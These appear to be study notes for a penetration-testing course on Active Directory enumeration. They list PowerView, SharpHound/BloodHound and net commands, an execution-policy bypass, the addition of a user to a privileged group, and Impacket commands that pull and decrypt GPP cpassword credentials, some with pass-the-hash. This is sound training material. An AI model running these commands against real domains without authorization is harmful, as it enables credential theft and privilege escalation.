## Section 1 Active Directory Introduction
- Don't ignore when you get access to another low-privileged user
	- Just begin the enumeration again because they may have different access
## Section 2 Manual Enumeration
### 21.2.1 Enumeration Using Legacy Windows Tools
- Get all users on the domain with 
```
net user /domain
```
- Get detailed information on a specific user with 
```
net user <USERNAME> /domain
```
- Get info on groups in the domain with 
```
net group /domain
```
- Look for custom groups that were created and enumerate those first
- Enumerate a specific group with
```
net group <GROUP_NAME> /domain
```
- Check local admins with
```
net localgroup Administrators
```
### 21.2.2 Enumerating Active Directory Using PowerShell and .NET Classes
- Because there can be multiple DCs in a domain it is important to find the Primary Domain Controller (PDC)
	- There can only be one of these per domain and it holds the PdcRoleOwner property
- Three parts to LDAP communication
```
LDAP://<HOSTNAME>[:PORT_NUMBER(optional)][/DistinguishedName]
```
- To get the Domain Class and the GetCurrentdomain method run the following command in powershell
```
[System.DirectoryServices.ActiveDirectory.Domain]
```
- Check the resources file for the Get_domain_information.ps1 file
- Bypass execution policy in powershell with 
```
powershell -ep bypass
```
- Check the resources folder for the domain_enumeration.ps1 file
- Check the resources folder for the domain_enumeration_v2.ps1 file
### Adding Search Functionality To Our Script
- Check resources folder for domain_enumeration_complete.ps1
- Check resources folder for domain_enum_function.ps1
- How to use domain_enum_function.ps1
```
Import-Module .\domain_enum_function.ps1
```
- Filter on a specific samAccountType
```
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```
- To filter on an objectclass group
```
LDAPSearch -LDAPQuery "(objectclass=group)"
```
- To enumerate every group available in the domain and also display the user members we can pipe the output in a new variable and use a foreach loop tat will print the property for a group.
	- This allows us to select specific attributes we are interested in
	- For example let's focus on the CN and member attributes with 
```
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group))) {$group.properties | select {$_.cn}, {$_.member}}
```
- To specify the sales department use 
```
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member
```
### 21.2.4 AD Enumeration With Powerview
- First 
```
powershell -ep bypass
```
```
Import-Module .\PowerView.ps1
```
- Get Domain info
```
Get-NetDomain
```
- Get cn for users in Get-NetUser
```
Get-NetUser | select cn 
```
- Find users with old or weak passwords
```
Get-NetUser | select cn,pwlastset,lastlogon
```
- Enumerate groups
```
Get-NetFroups 
```
- Clean Group enumeration
```
Get-NetGroup | select cn
```
- Enumerate specific groups
```
Get-NetGroup "<GROUPNAME>" 
```
- Enumerate specific group for members 
```
Get-NetGroup "<GROUPNAME>" | select member
```
- Find vulnerable operating systems 
```
Get-NetComputer | select operatingsystem,operatingsystemversion
```
- Scan the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
```
Find-LocalAdminAccess
```
### 21.3.2 Getting An Overview - Permissions and Logged On Users
- You may not want to go straight to domain admins because that is suspicious
	- There may be other accounts that have higher privileges than domain user that we could use to maintain access
		- Like a user from the Service Accounts Group which may have local administrator privileges on specific services
- PowerView find any administrative access for a user
```
Find-LocalAdminAccess
```
- PowerView find any logged in users with
```
Get-NetSession -ComputerName <COMputeRNAME>
```
- If there is no output to make sure we aren't receiving any error messages use
```
Get-NetSession -ComputerName <COMPUTERNAME> -Verbose
```
- If the information is off you can troubleshoot permissions with 
```
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity | fl
```
- To find active sessions if Get-NetSessions is not available we can use PsLoggedon from the Sysinternals suite which may be installed by default
	- It is enabled on
		- Windows Server 2012 R2
		- Windows Server 2016 (1607)
		- Windows Server 2019 (1809)
		- Windows Server 2022 (21H2)
	- If it is enabled the service will stop after 10 minutes of activity to save resources
		- But it will re-enable with an automatic trigger when we connect with PsLoggedon
		- To run this you use
```
.\PsLoggedon.ese \\Computername
```
### 21.3.3 Enumeration Through Service Principal Names
- To enumerate SPNs on the domain both clients and servers use 
```
setspn -L
```
- If you know a specific service account name use 
```
setspn -L <SERVICE_NAME> (e.g. iis_service)
```
- PowerView get SPNs and pipe output to samaccountname and serviceprincipalname use
```
Get-NetUser -SPN | select samaccountname, serviceprincipalname
```
### 21.3.4 Enumerating Object Permissions
- List of the most important types of permissions on an ACE
	- GenericAll:
		- Full permissions on the object 
	- GenericWrite:
		- Edit certain attributes on the object 
	- WriteOwner
		- Change ownership of the object
	- WriteDACL
		- Edit the ACE's applied to the object 
	- AllExtendedRights
		- Change password
		- Reset password 
		- etc.
	- ForceChangePassword:
		- Password change for the object self (Self-Membership)
			- Add ourselves to for example a group
- Enumerate ACEs for a known identity with PowerView
```
Get-ObjectAcl -Identity stephanie
```
- Convert SID to name with PowerView
```
Convert-SidToName <SID>
```
- Highest permission you can have on an AD object is GenericAll
- Most of the time you are only interested in the following fields in Get-ObjectAcl
	- ActiveDirectoryRights
	- Security Identifier
	- Object SID is nice to have but it's not needed when we are enumerating specific objects in AD since it will only contain the SID for the object we are enumerating 
- Generate clean and manageable object 
	- powershell -eq flag to filter the ActiveDirectoryRights property
		- Only displaying the values that = GenericAll 
		- Pipe the results into selecting only displaying the SecurityIdentifier and ActiveDirectoryRights with 
```
Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier, ActiveDirectoryRights
```
- Convert multiple SIDs to names with PowerView
```
"<SID>","<SID>" | Convert-SidToName
```
- Add a powerful user to an AD group
```
net group "Management Department" stephanie /add /domain
```
- Verify with 
```
Get-NetGroup "Management Department" | select member
```
- Remove the user with 
```
net group "Management Department" stephanie /del /domain
```
### 21.3.5 Enumerating Domain Shares 
- Enumerate domain shares with PowerView
```
Find-DomainShare
```
- An important Domain share to investigate is SYSVOL 
	- May include files and folders that reside on the domain controller itself 
	- This particular share is typically used for various domain policies and scripts 
	- By default the SYSVOL folder is mapped to 
		- %SystemRoot%\SYSVOL\Sysvol\domain-name
		- Example enumeration is 
			- \\dc1.corp.com\Sysvol\corp.com
- During an assessment investigate every folder such as the policies and scripts folder with 
```
ls \\dc1.corp.com\Sysvol\corp.com\Policies
```
```
ls \\dc1.corp.com\Sysvol\corp.com\Scripts
```
- Look for encrypted passwords with a value of cpassword in old configuration files of backups in ml format
	- Commenly GPP-stored passwords are encrypted with AES-256 
	- The private key for the encryption has been posted on MDSDN
	- We can use this key to decrypt the password with 
```
gpp-decrypt "<PASSWORD_STRING>"
```
## Section 4 Active Directory - Automated Enumeration

### 21.4.1 Collecting Data with SharpHound
- Import Sharphound to memory 
```
powershell -ep bypass
```
```
Import-Module .\Sharphound.ps1
```
- The following must be run before running Sharphound
```
Invoke-BloodHound
```
- Get help for Invoke-BloodHound with
```
Get-Help Invoke-BloodHound
```
- Begin with Collection method 
	- This describes the various collection methods
		- We will often gather ALL data 
		- This performs all collection methods except for local group policies 
		- By default Sharphound will gather the data in JSON files and automatically zip them making it easy for us to transfer the file to kali later
		- We will have to save this file on our desktop with a "<FILE_NAME>" prefix
		- Example 
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
```
- BloodHound automatically creates the .bin cache file to speed up data collection 
	- This is not needed for our analysis and we can safely delete it.
- SharpHound also supports logging
	- This means that the collector will run cyclical queries of our choosing over a period of time 
- While the collection we used previously created a snapshot over the domain
	- Running it in a loop may gather additional data as the environment changes 
- The cache file speeds up the process 
	- For example if a user logged on after we collectedd a snapshot we would have missed it in our snapshot but we will not miss it with the looping functionality
		- NOT NEEDED FOR THE TEST 
- Bloodhound-python
```
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c all
#Output saved in kali machine
```
### 21.4.2 Analyzing Data Using BloodHound
- Run neo4j with 
```
sudo neo4j start
```
- Default credentials for neo4j are 
	- neo4j:neo4j
- After running neo4j start bloodhound from the terminal with
```
bloodhound
```
- To logon use the neo4j username and password
- Upload the zip file from SharpHound via the upload gui
- In BloodHound analysis starts with Find all Domain Admins under domain information 
	- This gives you a graph
- Then focus on the shortest paths shown in the Analysis tab
	- This shows the shortest path to domain admin
	- In a relationship click the line between nodes and click ?help and BloodHound will show additional information
## LDAPDOMAINDUMP
- These files contain information in a well structured webpage format
```
sudo ldapdomaindump ldaps://<IP> -u '<USERNAME>' -p '<PASSWORD>'
```
## PlumHound
- Link: [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound) install from the steps mentioned.
- Keep both Bloodhound and Neo4j running as this tool acquires information from them.
```
sudo python3 plumhound.py --easy -p <NEO4JPASSWORD>
```
```
python3 plumhound.py -x tasks/default.tasks -p <NEO4jPASSWORD>
```
```
firefox index.html
```
## PingCastle
- [www.pingcastle.com](http://www.pingcastle.com/) - Download Zip file from here.
- This needs to be run on windows machine, just hit enter and give the domain to scan.
- It gives a report at end of scan.
## PsLoggedon
- Check to see user logons at remote system of a domain
```
.\PsLoggedon.exe \\<COMPUTERNAME>
```
## GPP or CPassword
- Impacket tools
- With a NULL session
```
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
```
- With cleartext credentials
```
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
- Pass the hash (NT Hash)
```
Get-GPPPassword.py -hashes:'NTHASH' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```
- Parse a local file
```
Get-GPPPassword.py -xmlfile '/path/to/policy.xml' 'LOCAL'
```
